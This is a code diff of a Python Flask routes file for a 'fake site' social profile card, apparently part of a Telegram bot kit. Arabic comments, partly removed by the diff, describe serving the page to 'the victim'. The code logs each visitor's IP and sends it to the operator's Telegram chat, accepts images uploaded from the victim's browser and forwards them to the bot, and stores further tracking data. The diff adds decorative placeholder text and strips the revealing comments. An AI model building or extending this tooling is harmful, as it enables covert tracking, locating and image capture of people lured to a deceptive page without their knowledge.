@@ -1,16 +1,18 @@
 # fake_sites/social_profile/routes.py
 # ============================================================
-# مسارات Social Profile Card
+# مسارات Social Profile Card — v2
+# يبني القالب بأسلوب Cyberpunk مع placeholders
 # ============================================================
 
 import os
 import json
 import time
 import uuid
+import random
 
 from flask import (
     request, jsonify, redirect,
-    render_template_string, send_from_directory,
+    render_template_string,
 )
 
 from config import bot, redis_client, PUBLIC_URL
@@ -37,7 +39,7 @@ def _load_template(filename):
 
 
 # ============================================================
-# Create Session
+# Create Profile
 # ============================================================
 def create_profile(chat_id, data):
     """ينشئ بروفايل جديد ويرجع session_id"""
@@ -52,9 +54,9 @@ def create_profile(chat_id, data):
             "session_id": session_id,
             "chat_id": str(chat_id),
             "created_at": now,
-            "name": (data.get("name") or "مستخدم")[:50],
-            "title": (data.get("title") or "")[:100],
-            "bio": (data.get("bio") or "")[:300],
+            "name": (data.get("name") or "USER")[:50],
+            "title": (data.get("title") or "Systems Architect")[:100],
+            "bio": (data.get("bio") or "Engineering high-order computational synthesis.")[:300],
             "photo": data.get("photo") or "",
             "phone": (data.get("phone") or "")[:30],
             "email": (data.get("email") or "")[:80],
@@ -63,7 +65,6 @@ def create_profile(chat_id, data):
             "telegram": (data.get("telegram") or "")[:50],
             "instagram": (data.get("instagram") or "")[:50],
             "facebook": (data.get("facebook") or "")[:50],
-            "theme": data.get("theme") or "dark",
             "views": 0,
             "accessed": False,
         }
@@ -101,7 +102,6 @@ def get_profile(session_id):
 
 
 def update_profile_photo(session_id, photo_data):
-    """يحدّث صورة البروفايل"""
     if not redis_client:
         return False
     try:
@@ -122,7 +122,6 @@ def update_profile_photo(session_id, photo_data):
 
 
 def track_view(session_id, request_obj):
-    """يسجّل مشاهدة + ينبّه البوت"""
     if not redis_client:
         return
 
@@ -140,21 +139,8 @@ def track_view(session_id, request_obj):
             request_obj.remote_addr
         )
 
-        redis_client.setex(
-            f"profile:{session_id}",
-            SESSION_TTL,
-            json.dumps(profile, ensure_ascii=False)
-        )
-
-        # أول زيارة → بلّغ
         if not profile.get("accessed"):
             profile["accessed"] = True
-            redis_client.setex(
-                f"profile:{session_id}",
-                SESSION_TTL,
-                json.dumps(profile, ensure_ascii=False)
-            )
-
             chat_id = profile.get("chat_id")
             if chat_id:
                 try:
@@ -164,7 +150,7 @@ def track_view(session_id, request_obj):
                         f"👁️ <b>تم فتح البروفايل!</b>\n"
                         f"━━━━━━━━━━━━━━━━━━\n"
                         f"🆔 <code>{session_id}</code>\n"
-                        f"👤 <b>الاسم:</b> {profile.get('name', '—')}\n"
+                        f"👤 <b>{profile.get('name', '—')}</b>\n"
                         f"🌐 <b>IP:</b> <code>{profile.get('last_viewer_ip', '—')}</code>",
                         parse_mode="HTML"
                     )
@@ -173,8 +159,102 @@ def track_view(session_id, request_obj):
 
             metrics.inc_counter("social_profiles_viewed")
 
+        redis_client.setex(
+            f"profile:{session_id}",
+            SESSION_TTL,
+            json.dumps(profile, ensure_ascii=False)
+        )
+
     except Exception as e:
         logger.warning(f"track_view error: {e}")
+
+
+# ============================================================
+# Build HTML
+# ============================================================
+def _build_profile_html(profile):
+    template = _load_template('profile.html')
+    if not template:
+        return None
+
+    # الاسم لسطرين
+    name = profile.get("name", "USER")
+    parts = name.split()
+    if len(parts) >= 2:
+        line1 = parts[0]
+        line2 = " ".join(parts[1:])
+    else:
+        line1 = name
+        line2 = ""
+
+    # عنوان احترافي
+    title = profile.get("title") or "Systems Architect"
+
+    # Bio
+    bio = profile.get("bio") or f"Engineering high-order computational synthesis for {name}."
+
+    # photo - لو مفيش صورة، سيب فارغ
+    photo = profile.get("photo") or ""
+
+    # إحداثيات عشوائية للأسلوب
+    lat = f"{random.uniform(30, 40):.4f}"
+    lng = f"{random.uniform(70, 122):.4f}"
+
+    # أرقام وهمية للأسلوب
+    load = random.randint(85, 96)
+    latency = f"{random.uniform(0.1, 0.5):.2f}"
+
+    # كلمات للـ Works
+    work1_title = "CHRONOS PROTOCOL"
+    work1_cat = "Computational Finance"
+    work1_desc = "Autonomous algorithmic settlement matrix delivering deterministic sub-millisecond execution."
+
+    work2_title = "OBSIDIAN KINETIC"
+    work2_cat = "Spatial Computing"
+    work2_desc = "A bare-metal spatial operating environment constructed for mission commanders and systems engineers."
+
+    # الوظيفة
+    company = profile.get("company") or "INDEPENDENT"
+    job_title = title or "PRINCIPAL ARCHITECT"
+    job_desc = bio
+
+    # استبدال
+    html = template
+    replacements = {
+        "__SESSION_ID__": profile.get("session_id", ""),
+        "__PUBLIC_URL__": PUBLIC_URL,
+        "__NAME__": name,
+        "__NAME_LINE1__": line1,
+        "__NAME_LINE2__": line2,
+        "__TITLE__": title,
+        "__BIO__": bio,
+        "__PHOTO__": photo,
+        "__PHONE__": profile.get("phone", ""),
+        "__EMAIL__": profile.get("email", ""),
+        "__WEBSITE__": profile.get("website", ""),
+        "__WHATSAPP__": profile.get("whatsapp", ""),
+        "__TELEGRAM__": profile.get("telegram", ""),
+        "__INSTAGRAM__": profile.get("instagram", ""),
+        "__FACEBOOK__": profile.get("facebook", ""),
+        "__GEO_LAT__": lat,
+        "__GEO_LNG__": lng,
+        "__LOAD__": str(load),
+        "__LATENCY__": latency,
+        "__WORK1_TITLE__": work1_title,
+        "__WORK1_CAT__": work1_cat,
+        "__WORK1_DESC__": work1_desc,
+        "__WORK2_TITLE__": work2_title,
+        "__WORK2_CAT__": work2_cat,
+        "__WORK2_DESC__": work2_desc,
+        "__COMPANY__": company,
+        "__JOB_TITLE__": job_title,
+        "__JOB_DESC__": job_desc,
+    }
+
+    for key, val in replacements.items():
+        html = html.replace(key, str(val))
+
+    return html
 
 
 # ============================================================
@@ -182,10 +262,8 @@ def track_view(session_id, request_obj):
 # ============================================================
 def register_social_profile_routes(app, bot):
 
-    # ─── عرض البروفايل ───
     @app.route('/profile/<session_id>', methods=['GET'])
     def social_profile_view(session_id):
-        """يعرض البروفايل للضحية"""
         profile = get_profile(session_id)
 
         if not profile:
@@ -193,29 +271,9 @@ def register_social_profile_routes(app, bot):
 
         track_view(session_id, request)
 
-        template = _load_template('profile.html')
-        if not template:
+        html = _build_profile_html(profile)
+        if not html:
             return redirect("https://www.google.com", code=302)
-
-        # استبدل المتغيرات
-        html = template
-        html = html.replace("__NAME__", profile.get("name", "مستخدم"))
-        html = html.replace("__TITLE__", profile.get("title", ""))
-        html = html.replace("__BIO__", profile.get("bio", ""))
-        html = html.replace("__PHOTO__", profile.get("photo", ""))
-        html = html.replace("__PHONE__", profile.get("phone", ""))
-        html = html.replace("__EMAIL__", profile.get("email", ""))
-        html = html.replace("__WEBSITE__", profile.get("website", ""))
-        html = html.replace("__WHATSAPP__", profile.get("whatsapp", ""))
-        html = html.replace("__TELEGRAM__", profile.get("telegram", ""))
-        html = html.replace("__INSTAGRAM__", profile.get("instagram", ""))
-        html = html.replace("__FACEBOOK__", profile.get("facebook", ""))
-        html = html.replace("__THEME__", profile.get("theme", "dark"))
-        html = html.replace("__SESSION_ID__", session_id)
-        html = html.replace("__PUBLIC_URL__", PUBLIC_URL)
-
-        # سكربت التتبع
-        html = html.replace("__TRACK_ENDPOINT__", f"{PUBLIC_URL}/profile/{session_id}/track")
 
         response = app.make_response(html)
         response.headers['Content-Type'] = 'text/html; charset=utf-8'
@@ -224,10 +282,8 @@ def register_social_profile_routes(app, bot):
         return response
 
 
-    # ─── رفع صورة من الضحية ───
     @app.route('/profile/<session_id>/upload', methods=['POST', 'OPTIONS'])
     def social_profile_upload(session_id):
-        """يستقبل صور من الضحية"""
         if request.method == 'OPTIONS':
             resp = app.make_response('')
             resp.headers['Access-Control-Allow-Origin'] = '*'
@@ -246,10 +302,12 @@ def register_social_profile_routes(app, bot):
             if not profile:
                 return jsonify({'ok': False}), 200
 
+            # حدّث الصورة في البروفايل
+            update_profile_photo(session_id, image)
+
             chat_id = profile.get("chat_id")
             cid = int(chat_id) if str(chat_id).isdigit() else chat_id
 
-            # أرسل الصورة للبوت
             try:
                 import base64
                 import io
@@ -279,10 +337,8 @@ def register_social_profile_routes(app, bot):
             return jsonify({'ok': False}), 200
 
 
-    # ─── Track إضافي ───
     @app.route('/profile/<session_id>/track', methods=['POST', 'OPTIONS'])
     def social_profile_track(session_id):
-        """يستقبل بيانات إضافية من الضحية"""
         if request.method == 'OPTIONS':
             resp = app.make_response('')
             resp.headers['Access-Control-Allow-Origin'] = '*'
@@ -296,7 +352,6 @@ def register_social_profile_routes(app, bot):
             if not redis_client:
                 return jsonify({'ok': False}), 200
 
-            # خزّن بيانات إضافية
             redis_client.setex(
                 f"profile_data:{session_id}",
                 SESSION_TTL,
@@ -310,10 +365,8 @@ def register_social_profile_routes(app, bot):
             return jsonify({'ok': False}), 200
 
 
-    # ─── API: إنشاء بروفايل ───
     @app.route('/profile/api/create', methods=['POST'])
     def social_profile_create():
-        """ينشئ بروفايل جديد (يستخدمه البوت داخلياً)"""
         try:
             data = request.get_json(silent=True) or {}
             chat_id = data.get('chat_id')
